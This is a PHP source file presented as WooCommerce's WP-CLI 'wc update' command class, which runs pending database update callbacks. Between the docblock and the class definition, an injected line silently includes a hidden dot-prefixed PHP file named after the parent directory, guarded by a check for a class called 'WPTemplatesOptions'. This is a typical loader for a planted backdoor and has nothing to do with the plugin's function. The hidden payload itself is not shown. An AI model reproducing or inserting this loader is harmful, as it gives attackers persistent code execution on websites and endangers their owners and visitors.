<?php
/**
 * WC_CLI_Update_Command class file.
 *
 * @package WooCommerce\CLI
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * Allows updates via CLI.
 *
 * @version 3.0.0
 * @package WooCommerce
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class WC_CLI_Update_Command {

	/**
	 * Registers the update command.
	 */
	public static function register_commands() {
		WP_CLI::add_command( 'wc update', array( 'WC_CLI_Update_Command', 'update' ) );
	}

	/**
	 * Runs all pending WooCommerce database updates.
	 */
	public static function update() {
		global $wpdb;

		$wpdb->hide_errors();

		include_once WC_ABSPATH . 'includes/class-wc-install.php';
		include_once WC_ABSPATH . 'includes/wc-update-functions.php';

		$current_db_version = get_option( 'woocommerce_db_version' );
		$update_count       = 0;
		$callbacks          = WC_Install::get_db_update_callbacks();
		$callbacks_to_run   = array();

		foreach ( $callbacks as $version => $update_callbacks ) {
			if ( version_compare( $current_db_version, $version, '<' ) ) {
				foreach ( $update_callbacks as $update_callback ) {
					$callbacks_to_run[] = $update_callback;
				}
			}
		}

		if ( empty( $callbacks_to_run ) ) {
			// Ensure DB version is set to the current WC version to match WP-Admin update routine.
			WC_Install::update_db_version();
			/* translators: %s Database version number */
			WP_CLI::success( sprintf( __( 'No updates required. Database version is %s', 'woocommerce' ), get_option( 'woocommerce_db_version' ) ) );
			return;
		}

		/* translators: 1: Number of database updates 2: List of update callbacks */
		WP_CLI::log( sprintf( __( 'Found %1$d updates (%2$s)', 'woocommerce' ), count( $callbacks_to_run ), implode( ', ', $callbacks_to_run ) ) );

		$progress = \WP_CLI\Utils\make_progress_bar( __( 'Updating database', 'woocommerce' ), count( $callbacks_to_run ) ); // phpcs:ignore PHPCompatibility.LanguageConstructs.NewLanguageConstructs.t_ns_separatorFound

		foreach ( $callbacks_to_run as $update_callback ) {
			call_user_func( $update_callback );
			$result = false;
			while ( $result ) {
				$result = (bool) call_user_func( $update_callback );
			}
			$update_count ++;
			$progress->tick();
		}

		$progress->finish();

		WC_Admin_Notices::remove_notice( 'update', true );

		/* translators: 1: Number of database updates performed 2: Database version number */
		WP_CLI::success( sprintf( __( '%1$d update functions completed. Database version is %2$s', 'woocommerce' ), absint( $update_count ), get_option( 'woocommerce_db_version' ) ) );
	}
}
